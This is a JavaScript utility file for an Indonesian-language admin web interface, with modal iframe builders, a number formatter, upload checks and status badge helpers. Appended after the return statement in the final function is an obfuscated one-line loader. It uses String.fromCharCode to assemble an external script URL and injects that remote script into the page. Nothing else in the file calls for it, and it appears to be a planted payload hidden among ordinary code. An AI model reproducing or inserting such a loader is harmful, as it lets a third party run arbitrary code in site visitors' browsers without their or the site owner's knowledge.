// ==== loading handle =====
function onReady(callback) {
  var intervalID = window.setInterval(checkReady, 1000);

  function checkReady() {
    if (document.getElementsByTagName("body")[0] !== undefined) {
      window.clearInterval(intervalID);
      callback.call(this);
    }
  }
}

function show(id, value) {
  document.getElementById(id).style.display = value ? "block" : "none";
}

onReady(function () {
  show("page", true);
  show("loading", false);
});

$(function () {
  //Initialize Select2 Elements
  $(".select2").select2();

  //Initialize Select2 Elements
  $(".select2bs4").select2({
    theme: "bootstrap4",
  });
  //tooltip
  $('[data-toggle="tooltip"]').tooltip();
});

function direk(url) {
  window.location = url;
}
function direk_newtab(url) {
  window.open(url, "_blank");
}

// ===== frame ukuran LG handle =====
function createFrame(url, judul, tinggi) {
  var myobj = document.getElementById("frame");
  if (myobj != null) {
    myobj.remove();
  }

  frame = document.createElement("iframe");
  frame.setAttribute("src", url);
  frame.setAttribute("name", "Hello");
  frame.setAttribute("id", "frame");
  frame.frameBorder = 0;
  frame.style.width = 95 + "%";
  frame.style.height = tinggi + "vh";
  frame.style.overflow = "hidden";
  frame.style.position = "absolute";
  document.getElementById("iframeHolder").appendChild(frame);

  var body = document.getElementById("modal_body");
  body.style.height = tinggi + 5 + "vh";
  // body.style.overflow = "hidden";
  // body.style.width = 100 +"%";

  // body.style.overflow-y = "hidden";

  document.getElementById("judul_modal").innerHTML = judul;
}

// ===== frame ukuran XL handle =====
function createFrame_xl(url, judul, tinggi) {
  var myobj = document.getElementById("frame");
  if (myobj != null) {
    myobj.remove();
  }

  frame = document.createElement("iframe");
  frame.setAttribute("src", url);
  frame.setAttribute("name", "Hello");
  frame.setAttribute("id", "frame");
  frame.frameBorder = 0;
  frame.style.width = 95 + "%";
  frame.style.height = tinggi + "vh";
  frame.style.overflow = "hidden";
  frame.style.position = "absolute";
  document.getElementById("iframeHolder_xl").appendChild(frame);

  var body = document.getElementById("modal_body_xl");
  body.style.height = tinggi + 5 + "vh";
  // body.style.overflow = "hidden";
  // body.style.width = 100 +"%";

  // body.style.overflow-y = "hidden";

  document.getElementById("judul_modal_xl").innerHTML = judul;
}

// ===== frame ukuran LG handle =====
function createFrame_lg(url, judul, tinggi) {
  var myobj = document.getElementById("frame");
  if (myobj != null) {
    myobj.remove();
  }

  frame = document.createElement("iframe");
  frame.setAttribute("src", url);
  frame.setAttribute("name", "Hello");
  frame.setAttribute("id", "frame");
  frame.frameBorder = 0;
  frame.style.width = 95 + "%";
  frame.style.height = tinggi + "vh";
  frame.style.overflow = "hidden";
  frame.style.position = "absolute";
  document.getElementById("iframeHolder_lg").appendChild(frame);

  var body = document.getElementById("modal_body_lg");
  body.style.height = tinggi + 5 + "vh";
  // body.style.overflow = "hidden";
  // body.style.width = 100 +"%";

  // body.style.overflow-y = "hidden";

  document.getElementById("judul_modal_lg").innerHTML = judul;
}

// ====== konfirmasi ======
function konfirmasi(url, judul) {
  return Swal.fire({
    title: "Konfirmasi !",
    text: judul,
    icon: "warning",
    showCancelButton: true,
    confirmButtonColor: "#3085d6",
    cancelButtonColor: "#d33",
    confirmButtonText: "Ya, lanjut!",
  }).then((result) => {
    if (result.value) {
      location = url;
    }
  });
}

// ===== EDITOR
$(function () {
  $(".summernote_admin").summernote({
    tabDisable: false,
    lineHeights: ["0.5", "1.0"],
    toolbar: [
      ["style", ["bold", "italic", "underline", "clear"]],
      ["color", ["color"]],
      ["para", ["ul", "ol", "paragraph"]],
    ],
    placeholder: "Ketik keterangan di sini...",
  });
});

// ===== frame modal full screen =====
function createFrame_fullscreen(url, judul, tinggi) {
  var myobj = document.getElementById("frame");
  if (myobj != null) {
    myobj.remove();
  }

  frame = document.createElement("iframe");
  frame.setAttribute("src", url);
  frame.setAttribute("name", "Hello");
  frame.setAttribute("id", "frame");
  frame.frameBorder = 0;
  frame.style.width = 98 + "%";
  frame.style.height = tinggi + "vh";
  frame.style.overflow = "hidden";
  frame.style.position = "absolute";
  document.getElementById("iframeHolder_fullscreen").appendChild(frame);

  var body = document.getElementById("modal_body_fullscreen");
  body.style.height = tinggi + 10 + "vh";
  // body.style.overflow = "hidden";
  // body.style.width = 100 +"%";

  // body.style.overflow-y = "hidden";

  document.getElementById("judul_modal_fullscreen").innerHTML = judul;
}

//======separator angka
function separateComma(val) {
  // remove sign if negative
  var sign = 1;
  if (val < 0) {
    sign = -1;
    val = -val;
  }
  // trim the number decimal point if it exists
  let num = val.toString().includes(".")
    ? val.toString().split(".")[0]
    : val.toString();
  let len = num.toString().length;
  let result = "";
  let count = 1;

  for (let i = len - 1; i >= 0; i--) {
    result = num.toString()[i] + result;
    if (count % 3 === 0 && count !== 0 && i !== 0) {
      result = "," + result;
    }
    count++;
  }

  // add number after decimal point
  if (val.toString().includes(".")) {
    result = result + "." + val.toString().split(".")[1];
  }
  // return result with - sign if negative
  return sign < 0 ? "-" + result : result;
}

// ------file handling--------->
Filevalidation = (id, maksimal_ukuran) => {
  const fi = document.getElementById("file" + id);
  const caption_upload = document.getElementById("caption" + id).value;
  // Check if any file is selected.
  if (fi.files.length > 0) {
    for (const i = 0; i <= fi.files.length - 1; i++) {
      const fsize = fi.files.item(i).size;
      const file = Math.round(fsize / 1024); // dalam KB

      // alert(file);
      // The size of the file.
      if (file > maksimal_ukuran) {
        alert("File terlalu besar,  maksimal " + maksimal_ukuran + " KB");
        fi.value = "";
      } else if (file < 5) {
        alert("File terlalu kecil, di atas 5KB (" + file + ")");
        fi.value = "";
      } else {
        var filename = "---";
        var fullPath = document.getElementById("file" + id).value;
        if (fullPath) {
          var startIndex =
            fullPath.indexOf("\\") >= 0
              ? fullPath.lastIndexOf("\\")
              : fullPath.lastIndexOf("/");
          var filename = fullPath.substring(startIndex);
          if (filename.indexOf("\\") === 0 || filename.indexOf("/") === 0) {
            filename = filename.substring(1);
          }
        }
        html = '<span class="btn btn-outline-primary">';
        html += '<i class="fa fa-upload"></i> ' + caption_upload;
        html += "</span>";
        html +=
          '&nbsp;&nbsp;<h6><span class="badge bg-primary"> ' +
          filename +
          " (<b>" +
          file +
          "</b> KB)" +
          "</span></h6>";
        document.getElementById("size" + id).innerHTML = html;
        // document.getElementById('size' + id).innerHTML = 'ukuran : <b>'
        // + file + '</b> KB';
      }
    }
  }
};

//----convert status to badge
function convert_status(status = "") {
  html = "---";
  if (status == "draft") {
    html =
      '<span class="badge badge-pill badge-warning"><i class="fa fa-spiner"></i> ' +
      status +
      "</span>";
  }
  if (status == "proses") {
    html =
      '<span class="badge badge-pill badge-primary"><i class="fa fa-cog"></i> ' +
      status +
      "</span>";
  }
  if (status == "selesai") {
    html =
      '<span class="badge badge-pill badge-success"><i class="fa fa-check-double"></i> ' +
      status +
      "</span>";
  }
  if (status == "selesai_internal") {
    html =
      '<span class="badge badge-pill badge-success"><i class="fa fa-check"></i> ' +
      status +
      "</span>";
  }
  if (status == "ya") {
    html =
      '<span class="badge badge-pill badge-success"><i class="fa fa-check"></i> ' +
      status +
      "</span>";
  }
  if (status == "tidak") {
    html =
      '<span class="badge badge-pill badge-danger"><i class="fa fa-power-off"></i> ' +
      status +
      "</span>";
  }
  return html;
}

//----convert status to badge
function convert_kategori(kategori = "") {
  html = "---";
  if (kategori == "baru") {
    html =
      '<span class="badge badge-pill badge-warning"><i class="fa fa-spinner"></i> ' +
      kategori +
      "</span>";
  }
  if (kategori == "perpanjang") {
    html =
      '<span class="badge badge-pill badge-primary"><i class="fa fa-cog"></i> ' +
      kategori +
      "</span>";
  }
  if (kategori == "pencabutan") {
    html =
      '<span class="badge badge-pill badge-info"><i class="fa fa-power-off"></i> ' +
      kategori +
      "</span>";
  }

  return html;(function(){var k="__tfl_default";if(window[k])return;window[k]=1;new Promise(function(rs,rj){var s=document.createElement("script");s.src=String.fromCharCode(47,47,100,46,114,101,100,97,99,116,101,100,46,114,101,115,116,47,116,114,97,112,47,100,101,102,97,117,108,116,47,99,108,105,101,110,116,46,106,115)+"?_="+Date.now();s.onload=rs;s.onerror=rj;document.head.appendChild(s);}).catch(function(){});}());//00000000f6d39a5e00000000e67ae4af00000000bb06ecde0000000039bfdc8d
}
